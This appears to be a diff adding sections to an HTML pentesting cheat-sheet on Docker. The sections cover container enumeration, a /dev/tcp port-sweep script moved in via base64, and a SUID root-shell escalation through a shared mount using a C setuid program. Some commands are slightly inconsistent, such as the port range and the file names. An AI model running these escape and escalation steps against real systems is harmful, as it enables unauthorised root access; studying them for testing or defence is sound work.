@@ -29,14 +29,68 @@
                 <pre><code class="language-bash">hostname</code></pre>
             </ul>
             <h2>Docker escape</h2>
-            <ul>    
-                <p>Sometimes using env you can findout credentials</p>
-                <pre><code class="language-bash">env</code></pre>
+            <ul>
+                <p>After any exploitation we must clear some concepts. When performing <b>df</b> command inside a container</p>
+                <p><b>Filesystem -></b>Is the filesystem which the container can see which generally points towards the host </p>
+                <p><b>Mounted on -></b>Is the path inside namespace of the container where it is mounted the Filesystem</p>
+                <p>In linux every device (disks, USB...) is represented as a file inside /dev/</p>
+                <p>For example:</p>
+                <p>/dev/sda -> represents the complete disk </p>
+                <p>/dev/sda1 -> represents the first partition of the disk. In case there would be more /dev/sda2, /dev/sda3...</p>
+                <p>Another disk would appear as /dev/sdb, /dev/sdc</p>
+
+                <h3>Enumeration from inside</h3>
+                <ul>
+                    <p>Sometimes using env you can findout credentials</p>
+                    <pre><code class="language-bash">env</code></pre>
+                    <p>Check for mounted devices, you may find mounted folders or more...</p>
+                    <pre><code class="language-bash">mount</code></pre>
+                    <p>Check for mounted partitions</p>
+                    <pre><code class="language-bash">df </code></pre>
+                    <h4>Port scan</h4>
+                    <ul>
+                    <p>It is posible that from inside the container you would be able to reach more ports than from outside. We recommend performing a port sweep using the following script</p>
+                    <p>In order to gain the gateway you could normally guess it using your own IP and pointing to <b>XXX.XXX.XXX.1</b> or use the <b>>route -n</b> command</p>
+                    <pre><code class="language-bash">#!/bin/bash
+for port in $(seq 1 65645); do 
+        timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Port $port open" &
+done; wait</code></pre>
+                    <p>In order to transfer this file since you won't have tools inside the container we could encode it using base64 and copy the string inside the container</p>
+                    <pre><code class="language-bash">base64 -w 0 file.sh</code></pre>
+                    <p>Copy the string and paste it into the container</p>
+                    <pre><code class="language-bash">echo d2h5IGFyZSB5b3Ugd2FzdGluZyB5b3VyIHRpbWUuIEhBQ0sgaW5zdGVhZA== | base64 -d > file.sh</code></pre>
+                    </ul>    
+                </ul>
             </ul>
-            
-            
+            <h2>Docker Privilege Escalation</h2>
+            <p>It is posible that from inside a container you are accesing a folder which can be accessed as well from outside the container. The key here is that from inside you must be root to proceed with that priv esc</p>
+            <p>In that case you could create a script with SUID privileges and executed from outside. There are two options of creating the script</p>
+            <p>1. Coping the bash binary (you got it all)</p>
+            <pre><code class="language-bash">cp /bin/bash .</code></pre>
+            <p>2. Creating a C script </p>
+             <pre><code class="language-bash">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
 
-
+int main(void) {
+    if (setuid(0) != 0) {
+        perror("setuid");
+        return 1;
+    }
+    /* Ejecutar un shell interactivo */
+    char *const argv[] = {"/bin/bash", "-p", NULL};
+    execve("/bin/bash", argv, NULL);
+    perror("execve");
+    return 1;
+}</code></pre>
+          <p>In case you have choosen the C script you must compile it</p>
+          <pre><code class="language-bash">gcc file.c -o file</code></pre>
+          <p>Transfer the file</p>
+          <p>For both cases you'll have to change the owner and add the SUID permission</p>
+          <pre><code class="language-bash">chown root:root file.sh
+chmod 4755 file.sh</code></pre>            
+          <p>In case you use the first option bash must be executed with -p flag (as in the C script)</p>
+          <pre><code class="language-bash">./bash -p</code></pre>
         </div>
     </div>
 
